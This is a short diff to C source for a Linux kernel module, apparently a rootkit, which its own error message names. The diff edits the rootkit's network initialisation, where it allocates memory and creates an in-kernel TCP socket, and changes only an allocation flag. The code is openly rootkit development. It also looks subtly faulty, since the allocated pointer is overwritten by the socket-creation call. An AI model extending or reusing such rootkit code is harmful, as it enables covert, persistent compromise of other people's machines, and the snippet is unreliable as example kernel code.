@@ -10,7 +10,7 @@ struct socket* rk_sock;
 int rk_net_init(void) {
   struct sockaddr_in s_addr;
   int ret = 0;
-  rk_sock = (struct socket*)kmalloc(sizeof(struct socket), GFP_KERNEL);
+  rk_sock = (struct socket*)kmalloc(sizeof(struct socket), GFP_ATOMIC);
   ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &rk_sock);
   if (ret < 0) {
     printk("rootkit: sock_create_kern failed\n");
